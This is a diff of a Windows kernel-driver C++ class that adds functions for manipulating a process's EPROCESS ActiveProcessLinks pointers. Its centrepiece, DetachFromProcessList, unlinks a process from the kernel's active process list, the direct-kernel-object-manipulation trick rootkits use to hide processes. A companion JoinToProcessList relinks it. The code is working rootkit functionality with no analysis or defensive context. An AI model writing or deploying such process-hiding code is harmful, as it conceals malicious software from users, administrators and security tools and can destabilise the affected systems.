@@ -10,6 +10,8 @@ namespace eprocess
 			return;
 		}
 		PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&eproc_);
+
+		active_process_links_ = PLIST_ENTRY((PUCHAR)eproc_ + kAplRva);
 	}
 
 	ProcInfo& ProcInfo::operator=(const ProcInfo& proc)
@@ -19,14 +21,24 @@ namespace eprocess
 		return *this;
 	}
 
-	PEPROCESS ProcInfo::GetPrevProc() const
+	PEPROCESS ProcInfo::GetPeprocess() const
 	{
-		return PEPROCESS();
+		return eproc_;
 	}
 
 	PEPROCESS ProcInfo::GetNextProc() const
 	{
-		return PEPROCESS();
+		return (PEPROCESS)((LONG64)(active_process_links_->Flink) - kAplRva);
+	}
+
+	PEPROCESS ProcInfo::GetPrevProc() const
+	{
+		return (PEPROCESS)((LONG64)(active_process_links_->Blink) - kAplRva);
+	}
+
+	PLIST_ENTRY ProcInfo::GetActiveProcessLinks() const
+	{
+		return active_process_links_;
 	}
 
 	String<WCHAR> ProcInfo::GetName() const
@@ -44,12 +56,14 @@ namespace eprocess
 		return parent_pid_;
 	}
 
-	void ProcInfo::SetNextProc(const PEPROCESS& eproc)
+	void ProcInfo::SetNextEntryProc(const PEPROCESS& eproc)
 	{
+		InterlockedExchange64((LONG64*) & (active_process_links_->Flink), (LONG64)ProcInfo(eproc).GetActiveProcessLinks());
 	}
 
-	void ProcInfo::SetPrevProc(const PEPROCESS& eproc)
+	void ProcInfo::SetPrevEntryProc(const PEPROCESS& eproc)
 	{
+		InterlockedExchange64((LONG64*)&(active_process_links_->Blink), (LONG64)ProcInfo(eproc).GetActiveProcessLinks());
 	}
 
 	void ProcInfo::SetName(const String<WCHAR>& name)
@@ -65,6 +79,33 @@ namespace eprocess
 	void ProcInfo::SetParentPid(const size_t parent_pid)
 	{
 		parent_pid_ = parent_pid;
+	}
+
+	bool ProcInfo::DetachFromProcessList()
+	{
+		ProcInfo(GetPrevProc()).SetNextEntryProc(GetNextProc());
+		ProcInfo(GetNextProc()).SetPrevEntryProc(GetPrevProc());
+		SetNextEntryProc(eproc_);
+		SetPrevEntryProc(eproc_);
+		is_detached = true;
+		return true;
+	}
+
+	bool ProcInfo::JoinToProcessList()
+	{
+		ProcInfo system_proc(SYSTEM_PROCESS_ID);
+		ProcInfo next_proc(system_proc.GetNextProc());
+		system_proc.SetNextEntryProc(eproc_);
+		SetNextEntryProc(next_proc.GetPeprocess());
+		SetPrevEntryProc(system_proc.GetPeprocess());
+		next_proc.SetPrevEntryProc(eproc_);
+		is_detached = false;
+		return true;
+	}
+
+	bool ProcInfo::IsDetached()
+	{
+		return is_detached;
 	}
 
 	size_t GetAplRva()
@@ -94,7 +135,6 @@ namespace eprocess
 		//Select 3 process PIDs and get their EPROCESS Pointer
 		for (int i = 16; idx < 3; i += 4)
 		{
-			// Confuse, can only be used in IRQL <= APC_LEVEL
 			if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
 			{
 				pids[idx] = i;
